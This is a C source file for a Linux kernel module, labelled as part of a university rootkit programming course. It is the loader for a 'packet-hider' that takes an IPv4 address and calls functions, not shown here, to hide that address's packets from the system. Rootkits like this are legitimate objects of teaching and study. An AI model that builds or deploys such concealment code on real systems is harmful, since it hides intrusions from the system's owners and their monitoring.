/*
 * Rootkit for the course Rootkit Programming at TUM in WS2014/15.
 * Implemented by Guru Chandrasekhara and Martin Herrmann.
 */
#include <linux/kernel.h>
#include <linux/inet.h>

#include "hide_packet.h"
#include "include.h"

/*
 * module parameter  
 * To get the IP address, Input as string and parse it
 */
static char input_ip[16]; 
module_param_string(ipv4, input_ip, 16, 0);


/*
 * Function called when loading the kernel module.
 * Prints a welcome-message and then does its magic.
 */
int init_module (void)
{	
	u8 dst[4];
	int ret;

	ROOTKIT_DEBUG("Loading packet-hider LKM...\n");
	
	/* ensure the input is ipv4 address */
	ret = in4_pton(input_ip, -1, dst, -1, NULL); // Use the same function for convert into integer
	
	if(ret == 0)
	{
		ROOTKIT_DEBUG("Invalid IP-address. Please enter a valid address.\n");
		return -EINVAL;
	}
	
	load_packet_hiding(input_ip);
	
	return 0;
}

/*
 * Function called when unloading the kernel module.
 * Prints a goodbye-message and restores the kernel to its
 * original form.
 */
void cleanup_module (void)
{
	unload_packet_hiding();
	
	/* Finally, log the unloading */
	ROOTKIT_DEBUG("Unloading packet-hider... bye!\n");
}
